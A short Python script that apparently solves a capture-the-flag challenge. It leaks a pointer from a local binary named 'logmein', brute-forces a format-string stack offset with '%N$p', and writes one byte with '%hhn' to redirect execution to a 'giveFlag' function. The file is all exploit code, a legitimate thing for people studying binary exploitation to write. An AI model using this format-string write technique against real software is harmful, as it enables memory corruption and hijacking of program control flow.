import subprocess
import re
import struct
import sys

# Replace this with the actual address of giveFlag
give_flag_address = 0x00401236

# Run the binary and get the output
binary_path = './logmein'
output = subprocess.check_output(binary_path).decode()

# Extract the value of __ptr
ptr_address_str = re.search(r"user = (0x[0-9a-fA-F]+)", output)
ptr_address = int(ptr_address_str.group(1), 16)

# Calculate the value to write
value_to_write = (give_flag_address & 0xff)

# Find the offset of __ptr on the stack
stack_offset = 0
while True:
    payload = b"A" * 20
    payload += b"%%%d$p" % stack_offset
    with open('payload.txt', 'wb') as f:
        f.write(payload)
    with open('payload.txt', 'rb') as f:
        output = subprocess.check_output(binary_path, stdin=f).decode()
    if ptr_address_str.group(1) in output:
        break
    stack_offset += 1

# Create the payload
payload = b"A" * 20  # Fill up the username buffer
payload += b"%%%dc%%%d$hhn" % (value_to_write, stack_offset)  # Overwrite __ptr with give_flag_address

# Write the payload to a file
with open('payload.txt', 'wb') as f:
    f.write(payload)

# Run the binary again with the payload as input
with open('payload.txt', 'rb') as f:
    output = subprocess.check_output(binary_path, stdin=f).decode()

# Print the output, which should contain the flag
print(output)
